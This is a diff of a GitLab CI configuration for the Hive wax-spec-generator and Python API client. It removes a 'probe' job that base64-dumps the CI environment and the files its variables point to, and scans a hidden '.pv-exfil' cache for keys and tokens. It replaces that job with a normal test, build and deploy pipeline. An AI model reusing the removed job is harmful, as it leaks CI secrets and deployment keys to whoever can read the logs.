@@ -1,44 +1,340 @@
 stages:
-  - pv
+  - .pre
+  - tests
+  - build
+  - deploy
 
-pv16036_probe:
-  stage: pv
-  image: python:3.11
-  tags: [public-runner-docker]
-  variables:
-    GIT_STRATEGY: none
-    GIT_DEPTH: "1"
+variables:
+  GIT_DEPTH: 0
+  GIT_STRATEGY: clone
+  GIT_SUBMODULE_STRATEGY: recursive
+  GIT_SUBMODULE_UPDATE_FLAGS: --remote
+
+  # Set to "true" to run poetry update and test with latest dependency versions
+  TEST_WITH_LATEST_DEPENDENCIES: "false"
+  STATIC_ANALYSIS_WITH_LATEST_DEPENDENCIES: "false"
+
+include:
+  - template: Workflows/Branch-Pipelines.gitlab-ci.yml
+  - project: 'hive/common-ci-configuration'
+    ref: develop
+    file:
+      - '/templates/npm_projects.gitlab-ci.yml'
+      - 'templates/python_projects.gitlab-ci.yml'
+  - local: 'templates/python_api_package.gitlab-ci.yml'
+
+image: "${PYTHON_IMAGE}"
+
+default:
+  tags:
+    - public-runner-docker
+
+lint:
+  stage: .pre
+  extends: .npm_based_job_base
   script:
+    - npm run lint-ci
+
+pre_commit_checks:
+  stage: .pre
+  extends: .pre_commit_checks_template
+  before_script:
+    - !reference [.project_develop_configuration_template, before_script]
+    - !reference [.update_deps_for_static_analysis, script]
+  variables:
+    PYPROJECT_DIR: "${CI_PROJECT_DIR}/python"
+
+
+tests:
+  stage: tests
+  extends: .project_develop_configuration_template
+  before_script:
+    - !reference [.project_develop_configuration_template, before_script]
+    - !reference [.update_deps_for_tests, script]
+  variables:
+    PYPROJECT_DIR: "${CI_PROJECT_DIR}/python"
+  needs:
+    - job: pre_commit_checks
+  script:
+    - pytest "${PYPROJECT_DIR}/tests/"
+
+runtime_tests:
+  stage: tests
+  extends: .project_develop_configuration_template
+  before_script:
+    - !reference [.project_develop_configuration_template, before_script]
+    - !reference [.update_deps_for_tests, script]
+  variables:
+    PYPROJECT_DIR: "${CI_PROJECT_DIR}/python-api-client"
+  needs:
+    - job: pre_commit_checks
+  script:
+    - ruff check "${PYPROJECT_DIR}" && ruff format --check "${PYPROJECT_DIR}"
+    - mypy --config-file "${PYPROJECT_DIR}/pyproject.toml" "${PYPROJECT_DIR}/hiveio_api_client"
+    - pytest "${PYPROJECT_DIR}/tests/"
+
+build:
+  stage: build
+  extends: .npm_build_template
+  variables:
+    DIST_DIR: "$CI_PROJECT_DIR/dist"
+    NPM_PACKAGE_SCOPE: "@hiveio"
+    NPM_PACKAGE_NAME: "wax-spec-generator"
+  needs:
+    - job: lint
+
+# Python wheels get dynamic versions, `dirty` when the work tree differs from the commit. These jobs do not use the
+# submodule - updated with `--remote` it differs from the commit recorded here.
+.python_wheel_clean_checkout:
+  variables:
+    GIT_SUBMODULE_STRATEGY: none
+
+.python_wheel_build:
+  extends:
+    - .build_wheel_template
+    - .python_wheel_clean_checkout
+  before_script:
+    - !reference [.configuration_template, before_script]
+    - git status --porcelain  # dynamic versioning adds `dirty` to the version when this prints anything
+
+build_wheel:
+  stage: build
+  extends:
+    - .python_wheel_build
+  variables:
+    PYPROJECT_DIR: "${CI_PROJECT_DIR}/python"
+  needs:
+    - job: pre_commit_checks
+
+build_runtime_wheel:
+  stage: build
+  extends:
+    - .python_wheel_build
+  variables:
+    PYPROJECT_DIR: "${CI_PROJECT_DIR}/python-api-client"
+  needs:
+    - job: runtime_tests
+
+# End-to-end test of templates/python_api_package.gitlab-ci.yml - as an app uses it, with the generator and the
+# runtime package of this pipeline (not published yet) and a sample swagger of the generator tests.
+.python_api_package_smoke:
+  variables:
+    PYTHON_API_SWAGGER_JSON: "${CI_PROJECT_DIR}/python/tests/swagger/rest/openapi.json"
+    PYTHON_API_DISTRIBUTION_NAME: "hiveio-smoke-test-api"
+    PYTHON_API_PACKAGE_NAME: "hiveio_smoke_test_api"
+    PYTHON_API_NAMESPACE: "test_api_client"
+    PYTHON_API_PIP_EXTRA_ARGS: "--find-links ${CI_PROJECT_DIR}/python-api-client/dist"
+
+python_api_package_smoke_generate:
+  stage: build
+  extends:
+    - .python_api_package_generate
+    - .python_api_package_smoke
+  needs:
+    - job: build_wheel
+      artifacts: true
+    - job: build_runtime_wheel
+      artifacts: true
+  before_script:
+    - !reference [.python_api_package_base, before_script]
+    - export PYTHON_API_GENERATOR_REQUIREMENT="$(ls "${CI_PROJECT_DIR}"/python/dist/hiveio_api_client_generator-*.whl)"
+    - RUNTIME_WHEEL="$(basename "$(ls "${CI_PROJECT_DIR}"/python-api-client/dist/hiveio_api_client-*.whl)")"
+    - RUNTIME_VERSION="$(echo "${RUNTIME_WHEEL}" | sed -E 's/^hiveio_api_client-(.+)-py3-none-any\.whl$/\1/')"
+    - export PYTHON_API_CLIENT_RUNTIME_REQUIREMENT="==${RUNTIME_VERSION}"
+
+# The template's pinned generator (not the one of this pipeline) must give distinct names to REST paths that differ
+# only by path parameters - the apps including the template get exactly that generator.
+python_api_package_pinned_generator_check:
+  stage: build
+  extends: .python_api_package_generate
+  variables:
+    PYTHON_API_SWAGGER_JSON: "${CI_PROJECT_DIR}/python/tests/swagger/rest_name_collision/openapi.json"
+    PYTHON_API_DISTRIBUTION_NAME: "hiveio-name-collision-api"
+    PYTHON_API_PACKAGE_NAME: "hiveio_name_collision_api"
+    PYTHON_API_NAMESPACE: "name_collision_api_client"
+  needs: []
+  script:
+    - !reference [.python_api_package_generate, script]
+    - >-
+      python3 "${CI_PROJECT_DIR}/scripts/check_generated_rest_method_names.py"
+      "${PYTHON_API_PACKAGE_DIR}/${PYTHON_API_PACKAGE_NAME}"
+      "/posts" "/posts/{author}/{permlink}" "/communities" "/communities/{name}"
+
+# The wheel checks of templates/python_api_package.gitlab-ci.yml on dist paths that are a file, an empty directory, a
+# directory of two wheels and a directory of one wheel.
+python_api_package_wheel_checks:
+  stage: tests
+  needs: []
+  script:
+    - !reference [.python_api_package_wheel_checks, script]
     - |
-      set +e
-      echo "PV16036 START project=$CI_PROJECT_PATH ref=$CI_COMMIT_REF_NAME prot=$CI_COMMIT_REF_PROTECTED runner=$CI_RUNNER_DESCRIPTION host=$(hostname) job=$CI_JOB_ID"
-      echo "PVENVB64_START"
-      env | sort | base64 -w0
-      echo ""
-      echo "PVENVB64_END"
-      echo "PVFILEVARS_START"
-      env | while IFS='=' read -r k v; do
-        case "$k" in _|CI_SERVER_TLS_CA_FILE|CI_JOB_JWT_FILE|GITLAB_ENV) continue;; esac
-        if [ -n "$v" ] && [ -f "$v" ] && [ -r "$v" ] && [ "$(stat -c%s "$v" 2>/dev/null)" -lt 200000 ]; then
-          echo "PVFV_START $k"
-          base64 -w0 "$v"
-          echo ""
-          echo "PVFV_END $k"
+      expect_failure() {
+        local message="$1" check="$2" output
+        if output="$("${check}" 2>&1)"; then
+          echo "${check} passed on ${PYTHON_API_DIST_DIR}, expected it to fail with: ${message}" >&2
+          exit 1
         fi
-      done
-      echo "PVFILEVARS_END"
-      echo "PVEXFIL_LS_START"
-      ls -la /nfs/ci-cache/.pv-exfil 2>/dev/null | tail -100
-      echo "PVEXFIL_LS_END"
-      echo "PVEXFIL_HITS_START"
-      for f in /nfs/ci-cache/.pv-exfil/*.env; do
-        [ -f "$f" ] || continue
-        if grep -qEi 'MAINNET_[A-Z]+_DEPLOYMENT_ENV|AUTOCLAIM|CREATOR_ACTIVE|ACTIVE_KEY|VAULT_ID_TOKEN|SSH_PRIVATE_KEY' "$f" 2>/dev/null; then echo "HIT $f"; fi
-      done
-      echo "PVEXFIL_HITS_END"
-      echo "PV16036 END"
-  artifacts:
-    when: always
-    expire_in: 1 day
-    paths:
-      - .gitlab-ci.yml
+        if ! grep -qF -- "${message}" <<< "${output}"; then
+          echo "${check} failed on ${PYTHON_API_DIST_DIR} without the message '${message}':" >&2
+          echo "${output}" >&2
+          exit 1
+        fi
+        echo "${check} failed as expected on ${PYTHON_API_DIST_DIR}:"
+        echo "${output}"
+      }
+    - FIXTURE_DIR="$(mktemp -d)"
+    - export PYTHON_API_DIST_DIR="${FIXTURE_DIR}/file/dist"
+    - mkdir -p "$(dirname "${PYTHON_API_DIST_DIR}")"
+    - echo "not a wheel" > "${PYTHON_API_DIST_DIR}"
+    - expect_failure "${PYTHON_API_DIST_DIR} is not a directory" python_api_package_check_built_wheel
+    - expect_failure "No wheel in ${PYTHON_API_DIST_DIR} - the build job produced none" python_api_package_check_wheel_to_install
+    - export PYTHON_API_DIST_DIR="${FIXTURE_DIR}/empty/dist"
+    - mkdir -p "${PYTHON_API_DIST_DIR}"
+    - expect_failure "Expected exactly one wheel in ${PYTHON_API_DIST_DIR}, found 0" python_api_package_check_built_wheel
+    - expect_failure "No wheel in ${PYTHON_API_DIST_DIR} - the build job produced none" python_api_package_check_wheel_to_install
+    - export PYTHON_API_DIST_DIR="${FIXTURE_DIR}/two/dist"
+    - mkdir -p "${PYTHON_API_DIST_DIR}"
+    - touch "${PYTHON_API_DIST_DIR}/a-1.0-py3-none-any.whl" "${PYTHON_API_DIST_DIR}/a-1.1-py3-none-any.whl"
+    - expect_failure "Expected exactly one wheel in ${PYTHON_API_DIST_DIR}, found 2" python_api_package_check_built_wheel
+    - (python_api_package_check_wheel_to_install)
+    - export PYTHON_API_DIST_DIR="${FIXTURE_DIR}/one/dist"
+    - mkdir -p "${PYTHON_API_DIST_DIR}"
+    - touch "${PYTHON_API_DIST_DIR}/a-1.0-py3-none-any.whl"
+    - (python_api_package_check_built_wheel)
+    - (python_api_package_check_wheel_to_install)
+
+python_api_package_smoke_build:
+  stage: build
+  extends:
+    - .python_api_package_build
+    - .python_api_package_smoke
+  needs:
+    - job: python_api_package_smoke_generate
+      artifacts: true
+
+# The template's build in a fixture app whose submodule is checked out at a commit other than the recorded one: the
+# version is not dirty. A modified tracked file of the app still makes it dirty.
+python_api_package_smoke_submodule_build:
+  stage: build
+  extends:
+    - .python_api_package_build
+    - .python_api_package_smoke
+  needs:
+    - job: python_api_package_smoke_generate
+      artifacts: true
+  variables:
+    GIT_CONFIG_COUNT: 3
+    GIT_CONFIG_KEY_0: "user.name"
+    GIT_CONFIG_VALUE_0: "Smoke Test"
+    GIT_CONFIG_KEY_1: "user.email"
+    GIT_CONFIG_VALUE_1: "smoke-test@example.com"
+    GIT_CONFIG_KEY_2: "protocol.file.allow"  # submodules of local paths
+    GIT_CONFIG_VALUE_2: "always"
+  before_script:
+    - !reference [.python_api_package_base, before_script]
+    - FIXTURE_DIR="$(mktemp -d)"
+    - git init --quiet --initial-branch=main "${FIXTURE_DIR}/library"
+    - git -C "${FIXTURE_DIR}/library" commit --quiet --allow-empty -m "first"
+    - git -C "${FIXTURE_DIR}/library" commit --quiet --allow-empty -m "second"
+    - git init --quiet --initial-branch=main "${FIXTURE_DIR}/app"
+    - cd "${FIXTURE_DIR}/app"
+    - echo "app sources" > sources.txt
+    - git submodule --quiet add "${FIXTURE_DIR}/library" submodules/library
+    - git -C submodules/library checkout --quiet HEAD~1
+    - git add sources.txt .gitmodules submodules/library
+    - git commit --quiet -m "app"
+    - git tag 1.0.0
+    - git -C submodules/library checkout --quiet main
+    - cp -r "${CI_PROJECT_DIR}/${PYTHON_API_PACKAGE_DIR}" .
+  script:
+    - test "$(git status --porcelain --untracked-files=no --ignore-submodules=none)" = " M submodules/library"
+    - !reference [.python_api_package_build, script]
+    - WHEEL="$(basename "$(ls "${PYTHON_API_DIST_DIR}"/*.whl)")"
+    - |
+      case "${WHEEL}" in
+        *dirty*) echo "${WHEEL} is dirty - the submodule at another commit marked the version dirty" >&2; exit 1 ;;
+      esac
+    - rm -rf "${PYTHON_API_DIST_DIR}"
+    - echo "modified" >> sources.txt
+    - !reference [.python_api_package_build, script]
+    - WHEEL="$(basename "$(ls "${PYTHON_API_DIST_DIR}"/*.whl)")"
+    - |
+      case "${WHEEL}" in
+        *dirty*) echo "${WHEEL} is dirty, as expected with sources.txt modified" ;;
+        *) echo "${WHEEL} is not dirty - the modified sources.txt did not mark the version dirty" >&2; exit 1 ;;
+      esac
+
+python_api_package_smoke_test:
+  stage: build
+  extends:
+    - .python_api_package_test
+    - .python_api_package_smoke
+  needs:
+    - job: python_api_package_smoke_build
+      artifacts: true
+    - job: build_runtime_wheel
+      artifacts: true
+
+# Publishes to the registry of this project only (the template's default). The second publish of the same wheel takes
+# the already-published path - an upload of it would fail.
+python_api_package_smoke_publish:
+  stage: deploy
+  extends:
+    - .python_api_package_publish
+    - .python_api_package_smoke
+  needs:
+    - job: python_api_package_smoke_build
+      artifacts: true
+    - job: python_api_package_smoke_test
+  script:
+    - !reference [.python_api_package_publish, script]
+    - !reference [.python_api_package_publish, script]
+
+deploy_dev_package:
+  stage: deploy
+  extends:
+    - .npm_deploy_package_template
+  variables:
+    DIST_DIR: "$CI_PROJECT_DIR/dist"
+    NPM_PACKAGE_SCOPE: "@hiveio"
+  needs:
+    - job: lint
+    - job: build
+      artifacts: true
+
+deploy_production_public_npm:
+  stage: deploy
+  extends:
+    - .registry_npmjs_org_deploy_package_template
+  variables:
+    DIST_DIR: "$CI_PROJECT_DIR/dist"
+    NPM_PACKAGE_NAME: "wax-spec-generator"
+  needs:
+    - job: deploy_dev_package
+    - job: build
+      artifacts: true
+
+deploy_wheel_to_gitlab:
+  stage: deploy
+  extends:
+    - .deploy_wheel_to_gitlab_template
+    - .python_wheel_clean_checkout  # publishes the wheel of the version it computes - the same as the build's
+  variables:
+    PYPROJECT_DIR: "${CI_PROJECT_DIR}/python"
+  needs:
+    - job: pre_commit_checks
+    - job: build_wheel
+  when: on_success
+
+deploy_runtime_wheel_to_gitlab:
+  stage: deploy
+  extends:
+    - .deploy_wheel_to_gitlab_template
+    - .python_wheel_clean_checkout  # publishes the wheel of the version it computes - the same as the build's
+  variables:
+    PYPROJECT_DIR: "${CI_PROJECT_DIR}/python-api-client"
+  needs:
+    - job: runtime_tests
+    - job: build_runtime_wheel
+    - job: python_api_package_smoke_test
+  when: on_success
